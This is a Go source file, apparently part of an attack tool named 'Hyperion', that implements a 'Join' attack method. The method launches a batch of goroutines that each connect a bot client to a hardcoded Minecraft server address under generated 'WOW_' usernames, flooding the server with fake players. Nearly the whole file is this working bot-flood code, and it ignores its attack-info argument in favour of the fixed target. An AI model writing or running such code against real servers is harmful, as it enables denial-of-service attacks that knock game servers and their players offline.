package methods

import (
	"Hyperion/core/method"
	"fmt"
	"sync"

	"github.com/Tnze/go-mc/bot"
)

type Join struct{}

func (join Join) Name() string {
	return "Join"
}

func (join Join) Description() string {
	return "Join method implementation"
}

func (join Join) Start(info method.AttackInfo) {
	wg := sync.WaitGroup{}
	for i := 0; i < 100; i++ {
		i = i + 1
		wg.Add(1)
		go func() {
			client := bot.NewClient()
			client.Auth = bot.Auth{
				Name: fmt.Sprintf("WOW_%d", i),
			}
			err := client.JoinServer("in1.hetzner.one:25579")
			if err != nil {
				fmt.Println(err)
			}
			wg.Done()
		}()
	}
	wg.Wait()
}
func (join Join) Stop() {
	// implementation for stopping the join method
}
